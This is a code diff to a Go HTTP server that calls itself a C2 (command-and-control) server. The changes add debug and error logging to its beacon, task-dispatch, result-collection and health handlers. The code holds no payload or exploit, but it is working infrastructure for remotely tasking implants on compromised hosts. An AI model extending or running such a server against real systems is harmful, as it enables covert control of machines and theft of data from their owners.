@@ -110,6 +110,8 @@ func (s *Server) Start(listenAddr string) error {
 	}
 	
 	s.logger.Info("Starting C2 server on %s", listenAddr)
+	s.logger.Debug("Server configuration: TLS=%v, ReadTimeout=%v, WriteTimeout=%v", 
+		s.config.Server.TLSEnabled, s.config.Server.ReadTimeout, s.config.Server.WriteTimeout)
 	
 	if s.config.Server.TLSEnabled {
 		certPath := s.config.Server.TLSCertPath
@@ -163,18 +165,33 @@ func (s *Server) Start(listenAddr string) error {
 		} else {
 			// Verify key file also exists
 			if _, err := os.Stat(keyPath); os.IsNotExist(err) {
+				s.logger.Error("Certificate exists but key file missing: %s", keyPath)
 				return fmt.Errorf("TLS certificate exists but key file not found: %s\n"+
 					"  Solution: Generate new certificates or provide both cert and key files", keyPath)
 			}
+			s.logger.Debug("Using existing TLS certificates: %s, %s", certPath, keyPath)
 		}
 		
-		return s.server.ListenAndServeTLS(certPath, keyPath)
+		s.logger.Info("Starting TLS server on %s", listenAddr)
+		if err := s.server.ListenAndServeTLS(certPath, keyPath); err != nil && err != http.ErrServerClosed {
+			s.logger.Error("TLS server failed: %v", err)
+			return fmt.Errorf("TLS server failed: %w", err)
+		}
+		return nil
 	}
 	
-	return s.server.ListenAndServe()
+	s.logger.Info("Starting HTTP server on %s", listenAddr)
+	if err := s.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
+		s.logger.Error("HTTP server failed: %v", err)
+		return fmt.Errorf("HTTP server failed: %w", err)
+	}
+	return nil
 }
 
 func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
+	s.logger.Debug("Incoming beacon request from %s (method: %s, headers: %v)", 
+		r.RemoteAddr, r.Method, r.Header)
+	
 	sessionID := r.Header.Get("X-Session-ID")
 	newSessionCreated := false
 	
@@ -184,6 +201,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	if sessionID != "" {
 		// Session ID provided - find existing session
 		session, _ = s.sessions[sessionID]
+		s.logger.Debug("Session ID provided: %s (found: %v)", sessionID, session != nil)
 	}
 	
 	if session == nil {
@@ -193,6 +211,7 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 			if existingSession.RemoteAddr == r.RemoteAddr {
 				session = existingSession
 				sessionID = id
+				s.logger.Debug("Matched existing session by RemoteAddr: %s -> %s", r.RemoteAddr, id)
 				break
 			}
 		}
@@ -210,16 +229,17 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 		}
 		s.sessions[sessionID] = session
 		newSessionCreated = true
-		// Don't log to stdout to avoid interrupting readline prompt
-		// Log will be written to file if file logging is enabled
-		s.logger.Debug("New session: %s from %s", sessionID, r.RemoteAddr)
+		s.logger.Info("New session created: %s from %s", sessionID, r.RemoteAddr)
+		s.logger.Debug("Total active sessions: %d", len(s.sessions))
 	} else {
 		// Existing session - update LastSeen
 		session.LastSeen = time.Now()
 		// Update RemoteAddr in case it changed (NAT, etc.)
 		if session.RemoteAddr != r.RemoteAddr {
+			s.logger.Debug("Session %s RemoteAddr changed: %s -> %s", sessionID, session.RemoteAddr, r.RemoteAddr)
 			session.RemoteAddr = r.RemoteAddr
 		}
+		s.logger.Debug("Existing session updated: %s (last seen: %v)", sessionID, session.LastSeen)
 	}
 	s.sessionsMu.Unlock()
 	
@@ -227,10 +247,14 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	var metadata map[string]interface{}
 	if err := json.NewDecoder(r.Body).Decode(&metadata); err == nil {
 		session.Metadata = metadata
+		s.logger.Debug("Received metadata for session %s: %v", sessionID, metadata)
+	} else if err.Error() != "EOF" {
+		s.logger.Debug("Failed to decode metadata for session %s: %v", sessionID, err)
 	}
 	
 	// Return any pending tasks
 	tasks := s.getPendingTasks(sessionID)
+	s.logger.Debug("Returning %d pending tasks for session %s", len(tasks), sessionID)
 	
 	response := map[string]interface{}{
 		"session_id": sessionID,
@@ -240,7 +264,12 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 	}
 	
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(response)
+	if err := json.NewEncoder(w).Encode(response); err != nil {
+		s.logger.Error("Failed to encode beacon response for session %s: %v", sessionID, err)
+		return
+	}
+	
+	s.logger.Debug("Beacon response sent successfully for session %s", sessionID)
 	
 	// Trigger notification for new sessions (only for truly new ones)
 	if newSessionCreated {
@@ -251,21 +280,27 @@ func (s *Server) handleBeacon(w http.ResponseWriter, r *http.Request) {
 func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 	sessionID := r.Header.Get("X-Session-ID")
 	if sessionID == "" {
+		s.logger.Error("Task request received without session ID from %s", r.RemoteAddr)
 		http.Error(w, "Missing session ID", http.StatusBadRequest)
 		return
 	}
 	
+	s.logger.Debug("Task request from session %s (from %s)", sessionID, r.RemoteAddr)
+	
 	tasks := s.getPendingTasks(sessionID)
+	s.logger.Debug("Retrieved %d pending tasks for session %s", len(tasks), sessionID)
 	
 	// Mark tasks as in-progress and schedule removal
 	for _, taskMap := range tasks {
 		if taskID, ok := taskMap["id"].(string); ok {
+			s.logger.Debug("Marking task %s as in_progress for session %s", taskID, sessionID)
 			if s.taskQueue != nil {
 				s.taskQueue.UpdateStatus(taskID, "in_progress")
 				// Remove task after completion timeout (30 seconds)
 				go func(id string) {
 					time.Sleep(30 * time.Second)
 					if task := s.taskQueue.Get(id); task != nil && task.Status == "in_progress" {
+						s.logger.Debug("Removing expired task %s after timeout", id)
 						s.taskQueue.Remove(id)
 					}
 				}(taskID)
@@ -274,45 +309,65 @@ func (s *Server) handleTask(w http.ResponseWriter, r *http.Request) {
 	}
 	
 	w.Header().Set("Content-Type", "application/json")
-	json.NewEncoder(w).Encode(map[string]interface{}{
+	if err := json.NewEncoder(w).Encode(map[string]interface{}{
 		"tasks": tasks,
-	})
+	}); err != nil {
+		s.logger.Error("Failed to encode task response for session %s: %v", sessionID, err)
+		return
+	}
+	
+	s.logger.Debug("Task response sent successfully for session %s", sessionID)
 }
 
 func (s *Server) handleResult(w http.ResponseWriter, r *http.Request) {
 	sessionID := r.Header.Get("X-Session-ID")
 	if sessionID == "" {
+		s.logger.Error("Result request received without session ID from %s", r.RemoteAddr)
 		http.Error(w, "Missing session ID", http.StatusBadRequest)
 		return
 	}
 	
+	s.logger.Debug("Result request from session %s (from %s)", sessionID, r.RemoteAddr)
+	
 	var result map[string]interface{}
 	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
+		s.logger.Error("Failed to decode result JSON from session %s: %v", sessionID, err)
 		http.Error(w, "Invalid JSON", http.StatusBadRequest)
 		return
 	}
 	
+	taskType, _ := result["type"].(string)
+	taskID, _ := result["task_id"].(string)
+	s.logger.Debug("Received result for task %s (type: %s) from session %s", taskID, taskType, sessionID)
+	
 	// Update task status and remove after completion
-	if taskID, ok := result["task_id"].(string); ok {
+	if taskID != "" {
 		if s.taskQueue != nil {
 			s.taskQueue.SetResult(taskID, result)
+			s.logger.Debug("Task %s result stored, scheduling removal", taskID)
 			// Remove task after a short delay to allow result processing
 			go func() {
 				time.Sleep(5 * time.Second)
 				s.taskQueue.Remove(taskID)
+				s.logger.Debug("Task %s removed after result processing", taskID)
 			}()
 		}
 	}
 	
-	s.logger.Info("Task result from session %s: %v", sessionID, result)
+	s.logger.Info("Task result from session %s: task_id=%s, type=%s", sessionID, taskID, taskType)
 	
 	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("OK"))
+	if _, err := w.Write([]byte("OK")); err != nil {
+		s.logger.Error("Failed to write result response: %v", err)
+	}
 }
 
 func (s *Server) handleHealth(w http.ResponseWriter, r *http.Request) {
+	s.logger.Debug("Health check request from %s", r.RemoteAddr)
 	w.WriteHeader(http.StatusOK)
-	w.Write([]byte("OK"))
+	if _, err := w.Write([]byte("OK")); err != nil {
+		s.logger.Error("Failed to write health check response: %v", err)
+	}
 }
 
 func (s *Server) getPendingTasks(sessionID string) []map[string]interface{} {
